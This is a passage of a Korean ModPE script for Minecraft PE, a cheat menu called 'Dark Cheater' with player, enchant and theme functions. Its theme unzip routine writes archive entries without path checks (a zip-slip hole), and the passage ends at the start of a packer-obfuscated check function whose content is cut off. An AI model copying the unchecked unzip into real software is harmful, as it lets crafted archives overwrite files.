onClick: function(m, w){
if(Level.getGameMode()==0){
inputAmount(items[w][0], items[w][1]);
}
else{
Entity.setCarriedItem(Player.getEntity(), items[w][0], 5, items[w][1]);
Dark.toast("설정되었습니다.");
}
}
}));
dialog.setTitle("아이템 검색 - 검색 결과 ("+str+")");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function antiMoveDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
var checks = new Array();
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(Player.getName(players[n]));
checks[n].setId(n);
checks[n].setTextColor(white);
if(antiMove.indexOf(players[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiMove.push(players[check.getId()]);
}
else if(onoff==false){
antiMove.splice(antiMove.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("이동 금지 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function playerHunger(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var value = Player.getHunger();
var txt = new android.widget.TextView(ctx);
txt.setText("허기 : "+Player.getHunger());
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var hh = new android.widget.SeekBar(ctx);
hh.setMax(20);
hh.setProgress(Player.getHunger());
hh.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
value = seek.getProgress();
txt.setText("허기 : "+value);
}
}));
layout.addView(hh);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("허기 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Player.setHunger(value);
Dark.toast("허기가 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputMaxHealth(target){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("최대 체력을 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("최대 체력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(target!=null){
for each(var pp in target)
Entity.setMaxHealth(pp, loc2.getText());
}
else{
Entity.setMaxHealth(playerTarget, loc2.getText());
Dark.toast("최대 체력이 "+loc2.getText()+"(으)로 설정되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function themeList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/").list().sort();
var dir2 = [];
for each(var f in dir){
var ff = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+f);
if(ff.isDirectory()) dir2.push(f);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
selectThemeAct(dir2[w]);
}
}));
dialog.setTitle("다크 치터 테마 관리 ("+dir2.length+"개)");
dialog.setNegativeButton("닫기", null);
dialog.setNeutralButton("다운로드", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
selectDownloadType();
Dark.toast("작업을 선택하세요.");
}
}));
dialog.setPositiveButton("불러오기", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
importTheme(sdcard);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectThemeAct(themeName){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var acts = ["테마 사용", "테마 삭제", "테마 정보"];
dialog.setItems(acts, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
switch(w){
case 0 : 
Dark.save("themeName", themeName);
Dark.toast("테마가 "+themeName+"(으)로 설정되었습니다.");
btnBackData = null;
titleBackData = null;
break;
case 1 : 
var folder = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+themeName+"/");
net.zhuoweizhang.mcpelauncher.Utils.clearDirectory(folder);
if(folder.exists()) folder.delete();
Dark.toast("테마가 삭제되었습니다.");
break;
case 2 : 
Dark.showDialog("테마 정보 보기", "테마 이름 : "+themeName+"\n제작자 : "+Dark.getThemeInfo(themeName)+"\n경로 : "+sdcard+"/darkTornado/darkCheater/themes/"+themeName+"/");
break;
}
}
}));
dialog.setTitle("다크 치터 테마 관리 - 작업 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function importTheme(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list().sort();
var dir2 = [];
var dir3 = [];
for each(var f in dir){
if(f.substring(0, 1)!="."){
var ff = new java.io.File(path+"/"+f);
var fff = f.split("\\.");
if(ff.isDirectory()) dir2.push(f);
else if(fff[fff.length-1]=="zip") dir3.push(f);
}
}
dir2.sort();
dir3.sort();
for each(var f in dir3) dir2.push(f);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
var file = new java.io.File(path+"/"+dir2[w]);
if(file.isDirectory()) importTheme(path+"/"+dir2[w]);
else unZipTheme(path+"/"+dir2[w], dir2[w].toString());
}
}));
dialog.setTitle("테마 불러오기");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function unZipTheme(zip, name){
try{
var path = sdcard+"/darkTornado/darkCheater/themes/"+name.substring(0, name.lastIndexOf("."));
var folder = new java.io.File(path);
folder.mkdir();
var fis = new java.io.FileInputStream(zip);
var zis = new java.util.zip.ZipInputStream(fis);
var entry;
while((entry = zis.getNextEntry())!=null){
var fos = new java.io.FileOutputStream(path+"/"+entry.getName());
var buf = new java.nio.ByteBuffer.allocate(1024).array();
var len;
while((len = zis.read(buf))>0){
fos.write(buf, 0, len);
}
zis.closeEntry();
fos.close();
}
zis.close();
Dark.toast("테마가 적용되었습니다.\n   (테마명 : "+name.substring(0, name.lastIndexOf("."))+")");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function selectDownloadType(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var acts = ["다크 치터 기본 제공 테마", "테마 다운로드 홈페이지"];
dialog.setItems(acts, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(checkInternet()){
switch(w){
case 0 : 
downloadTheme();
break;
case 1 : 
var uri = new android.net.Uri.parse("http:\/\/darktornado.dothome.co.kr\/darkCheater/theme.html");
var link = new android.content.Intent(android.content.Intent.ACTION_VIEW, uri);
ctx.startActivity(link);
break;
}
}
}
}));
dialog.setTitle("다크 치터 테마 관리 - 테마 다운로드");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function downloadTheme(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var themes = ["Cytus", "Deemo", "MCPE GUI", "Simple", "시노부", "시로", "이리야", "진격의 거인", "치노", "카나데"];
var urls = ["tc1kke4pu0utyxv\/Cytus", "prsp4ohfxk9p6st\/Deemo", "vo01s0vfs885ob7\/MCPE%20GUI", "gd3qqip2chvxj6y/Simple", "ly4e644n8kjmlm8\/%EC%8B%9C%EB%85%B8%EB%B6%80", "9pmonw61vfag5i6\/%EC%8B%9C%EB%A1%9C", "ynrejbx9m9oqs8t\/%EC%9D%B4%EB%A6%AC%EC%95%BC", "lmh7po7h7mb4707\/%EC%A7%84%EA%B2%A9%EC%9D%98%20%EA%B1%B0%EC%9D%B8", "hd77t15akdwgvus\/%EC%B9%98%EB%85%B8", "0zpe7chrulatzb6\/%EC%B9%B4%EB%82%98%EB%8D%B0"];
dialog.setItems(themes, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
download("Download", themes[w]+".zip", "다크 치터 테마 다운로드 ("+themes[w]+")", "https:\/\/www.dropbox.com\/s\/"+urls[w]+".zip?dl=1", 1);
}
}));
dialog.setTitle("다크 치터 테마 다운로드");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function download(path, file, title, url, hide){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(checkInternet()){
var uri = new android.net.Uri.parse(url);
var dm = new android.app.DownloadManager.Request(uri);
dm.setTitle(title);
dm.setDescription("파일 다운로드 중...");
dm.setDestinationInExternalPublicDir(path, file);
dm.setNotificationVisibility(hide);
ctx.getSystemService(android.content.Context.DOWNLOAD_SERVICE).enqueue(dm);
Dark.toast("파일 다운로드를 시작합니다.\n   (폴더 : "+sdcard+"/"+path+", 파일 : "+file+")");
}
else{
Dark.toast("인터넷에 연결되어있지 않습니다.");
}
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
}


function lightningPower(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var value = lp;
var txt = new android.widget.TextView(ctx);
txt.setText("폭발력 : "+value);
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var hh = new android.widget.SeekBar(ctx);
hh.setMax(10);
hh.setProgress(value);
hh.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
value = seek.getProgress();
txt.setText("폭발력 : "+value);
}
}));
layout.addView(hh);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("번개 폭발력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
lp = value;
if(lp==0) Dark.toast("비활성화되었습니다.");
else Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function darkPoint(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuD = new android.widget.PopupWindow();
var title = makeTitle("Dark Point");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
dpt = new android.widget.TextView(ctx);
dpt.setText(" 현재 포인트 : "+dp.p);
dpt.setTextSize(15);
dpt.setTextColor(white2);
layout.addView(dpt);
var dpd = new android.widget.ToggleButton(ctx);
dpd.setTextOn("다크 포인트 표시");
dpd.setTextOff("다크 포인트 표시");
if(dpw==null) dpd.setChecked(false);
else dpd.setChecked(true);
dpd.setTextColor(white2);
dpd.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
darkPointWindow(onoff);
}
}));
layout.addView(dpd);
var btns = new Array();
var menus = ["다크 스킬", "다크 인첸트", "모든 인첸트 해제", "Dark Tornado's Book 지급", "다크 포인트 설정", "도움말"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
switch(v.getId()){
case 0 : 
darkSkill();
break;
case 1 : 
darkEnchant();
break;
case 2 : 
Entity.setCarriedItem(Player.getEntity(), getCarriedItem(), Player.getCarriedItemCount(), Player.getCarriedItemData());
Dark.toast("모든 인첸트가 해제되었습니다.");
break;
case 3 : 
addItemInventory(511, 1, 0);
Dark.toast("지급되었습니다.");
break;
case 4 : 
inputDarkPoint();
break;
case 5 : 
Dark.showDialog("다크 포인트 도움말", "다크 포인트는 마인크래프트의 레벨이나 RPG 게임 등에서의 MP와 비슷한 개념입니다.\n다크 포인트를 소모하여 다크 스킬을 사용하거나 다크 인첸트를 할 수 있습니다. 다크 인첸트의 경우, 인첸트 레벨을 2 이상으로 올리지 못하는 것도 있습니다. 다크 인첸트를 하면 해당 아이템의 이름이 검게 바뀝니다.\n최대 다크 포인트는 100이고, 10초 간격으로 1씩 회복됩니다.\n\n\n<소모 포인트>\n\n-다크 스킬\n버스트 샷 : 10\n서라운드 플레임 : 20\n메테오 : 50\n샌드 익스플로젼 : 10\n바인드 : 5\n\n-다크 인첸트\n추가데미지 : 1 레벨 당 5\n폭발 : 1 레벨 당 10\n파괴 : 10\n순간이동 : 5\n즉사 : 50");
break;
}
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuD);
layout.addView(exit);
var scroll = makeScroll(layout, menuD);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuD.setContentView(layout2);
menuD.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function darkPointWindow(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
if(tf){
try{
dpw = new android.widget.PopupWindow();
dpwt = new android.widget.TextView(ctx)
dpwt.setText(" DP : "+dp.p);
dpwt.setTextSize(15);
dpwt.setTextColor(white);
dpwt.setGravity(android.view.Gravity.CENTER);
setDragListener(dpw, dpwt, 1);
dpw.setContentView(dpwt);
dpw.setWidth(dip2px(ctx, 70));
dpw.setHeight(dip2px(ctx, 20));
dpw.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
dpw.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.TOP, 0, 50);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
else{
if(dpw!=null){
dpw.dismiss();
dpw = null;
}
}
}
}));
}


function darkSkill(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var skills = ["버스트 샷", "서라운드 플레임", "메테오", "샌드 익스플로젼", "바인드"];
var points = [10, 20, 50, 10, 5];
dialog.setItems(skills, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(dp.p>=points[w]){
dp.s = (w+1);
dp.d = points[w];
Dark.toast("Dark Tornado's Book으로 터치하시면 스킬이 발동됩니다.");
}
else{
Dark.toast("포인트가 부족합니다.");
}
}
}));
dialog.setTitle("다크 스킬");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function darkEnchant(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var nn = null;
var types = ["종류 선택", "추가데미지", "폭발", "파괴", "순간이동", "즉사"];
var points = [null, 5, 10, 10, 5, 50];
var levels = [null, true, true, false, false, false];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
nn = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("강도 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("다크 인첸트 강도를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(Level.getGameMode()==0) var a = Player.getCarriedItemCount();
if(Level.getGameMode()==1) var a = 1;
if(nn==null){
Dark.toast("종류를 선택하여 주세요.");
}
else if(Dark.isEnchanted()){
Dark.toast("이미 다크 인첸트를 하였습니다.");
}
else{
if(levels[nn]){
if(points[nn]*Number(loc2.getText())*a>dp.p){
Dark.toast("포인트가 부족합니다.");
}
else{
Dark.setEnchant(types[nn], points[nn], Number(loc2.getText()));
Dark.toast("다크 인첸트를 하였습니다.");
}
}
else{
if(points[nn]*a>dp.p){
Dark.toast("포인트가 부족합니다.");
}
else{
Dark.setEnchant(types[nn], points[nn], 1);
Dark.toast("다크 인첸트를 하였습니다.");
}
}
}
}
}));
dialog.setTitle("다크 인첸트");
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputDarkPoint(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var value = dp.p;
var txt = new android.widget.TextView(ctx);
txt.setText("다크 포인트 : "+value);
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var hh = new android.widget.SeekBar(ctx);
hh.setMax(100);
hh.setProgress(value);
hh.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
value = seek.getProgress();
txt.setText("다크 포인트 : "+value);
}
}));
layout.addView(hh);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("다크 포인트 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
dp.p = value;
Dark.toast("포인트가 "+dp.p+"(으)로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function setBtnColor(){
if(Dark.read("useTheme")=="true"){
if(btnBackData!=null) return btnBackData;
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.png");
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.jpg");
var file3 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.jpeg");
if(file.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.png");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else if(file2.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.jpg");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else if(file3.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/button.jpeg");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
return btnBackData;
}
else{
return new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(80, 20, 20, 20));
}
}
else{
return new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(80, 20, 20, 20));
}
}

function makeTitle(txt, tf){
var title = new android.widget.TextView(ctx);
if(tf){
title.setText(txt);
title.setTextSize(23);
if(Dark.read("textBlack")=="true") title.setTextColor(android.graphics.Color.BLACK);
else title.setTextColor(android.graphics.Color.CYAN);
}
else{
title.setText(txt+"\n");
title.setTextSize(20);
title.setTextColor(white2);
}
title.setGravity(android.view.Gravity.CENTER);
var pad = dip2px(ctx, 3);
title.setPadding(pad, pad, pad, pad);
if(Dark.read("useTheme")=="true"){
if(titleBackData==null){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.png");
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.jpg");
var file3 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.jpeg");
if(file.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.png");
titleBackData = new android.graphics.drawable.BitmapDrawable(image);
}
else if(file2.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.jpg");
titleBackData = new android.graphics.drawable.BitmapDrawable(image);
}
else if(file3.exists()){
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/title.jpeg");
btnBackData = new android.graphics.drawable.BitmapDrawable(image);
}
else{
return title;
}
}
title.setBackgroundDrawable(titleBackData);
}
return title;
}

function makeButton(text){
var btn = new android.widget.Button(ctx);
btn.setText(text);
btn.setBackgroundDrawable(setBtnColor());
btn.setTextColor(white2);
return btn;
}

function makeScroll(layout, menu0){
var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT);
var scroll = new android.widget.ScrollView(ctx);
var pad = dip2px(ctx, 3);
scroll.setPadding(pad, pad, pad, pad);
scroll.setLayoutParams(svParams);
scroll.addView(layout);
if(Dark.read("alpha")=="true") var alpha = 255;
else var alpha = 70;
var color = Number(Dark.read("color"));
var colorData = Dark.read("colorData").toString().split(",");
if(color==1) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 200, 200, 200)));
else if(color==2) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 255, 0, 0)));
else if(color==3) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 0, 255, 0)));
else if(color==4) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 0, 0, 255)));
else if(color==5) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 255, 255, 0)));
else if(color==6) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 0, 255, 255)));
else if(color==7) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 255, 0, 255)));
else if(color==8) menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, colorData[0], colorData[1], colorData[2])));
else menu0.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(alpha, 0, 0, 0)));
menu0.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth()*1/3);
menu0.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
if(Dark.read("useTheme")=="true"){
var menus = [menu, menuI, menuA, menuD, menuW, menuP, menuP2, menuB, menuE, menuE2, menuWE, menuM, menuDL, menuS2, menuT, menuT2, menuEL, menuS];
var theme = ["main", "inven", "armor", "dark", "world", "player", "players", "ban", "entity", "entity2", "worldEdit", "move", "DL", "server", "antiTerror", "terrorHelper", "else", "settings"];
for(var n in menus){
if(menu0==menus[n]){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".png");
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpg");
if(file.exists()) var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".png");
else if(file2.exists()) var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpg");
else var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/themes/"+Dark.read("themeName")+"/"+theme[n]+".jpeg");
var back = new android.graphics.drawable.BitmapDrawable(image);
scroll.setBackgroundDrawable(back);
break;
}
}
}
return scroll;
}

function makeExit(menu){
var exit = new android.widget.Button(ctx);
exit.setText("나가기");
exit.setBackgroundDrawable(setBtnColor());
exit.setTextColor(white2);
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(menu!=null){
menu.dismiss();
menu = null;
}
}
});
exit.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(true);
return true;
}
});
return exit;
}

function setDragListener(w, v, n, tf){
try{
var longTouchCheck = false;
v.setOnLongClickListener(new android.view.View.OnLongClickListener({ onLongClick: function(v){
if(widgetDrag||tf) longTouchCheck = true;
return true;
}
}));
v.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch: function(v, ev){
try{
if(longTouchCheck&&(widgetDrag||tf)){
switch(ev.action){
case android.view.MotionEvent.ACTION_MOVE : 
var sX = ctx.getWindowManager().getDefaultDisplay().getWidth();
var sY = ctx.getWindowManager().getDefaultDisplay().getHeight();
if(n==0) w.update(ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==1) w.update(ev.getRawX()-sX/2, ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==2) w.update(sX-ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==3) w.update(ev.getRawX(), ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==4) w.update(ev.getRawX()-sX/2, ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==5) w.update(sX-ev.getRawX(), ev.getRawY()-sY/2, w.getWidth(), w.getHeight());
else if(n==6) w.update(ev.getRawX(), sY-ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==7) w.update(ev.getRawX()-sX/2, sY-ev.getRawY(), w.getWidth(), w.getHeight());
else if(n==8) w.update(sX-ev.getRawX(), sY-ev.getRawY(), w.getWidth(), w.getHeight());
break;
case android.view.MotionEvent.ACTION_UP : 
longTouchCheck = false;
break;
}
}
return false;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}
catch(err){
clientMessage(err+", "+err.lineNumber);
}
}

function setDragListenerForSeekBar(w, v, tf){
v.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
try{
if(widgetDrag){
if(ev.action==android.view.MotionEvent.ACTION_DOWN){
dou.seek = true;
}
if(dou.seek2>100&&ev.action==android.view.MotionEvent.ACTION_MOVE){
if(tf) w.update(ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
else w.update(ctx.getWindowManager().getDefaultDisplay().getWidth()-ev.getRawX(), ev.getRawY(), w.getWidth(), w.getHeight());
}
if(ev.action==android.view.MotionEvent.ACTION_UP){
dou.seek = false;
dou.seek2 = 0;
}
}
return false;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function checkDarkCheater(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('K 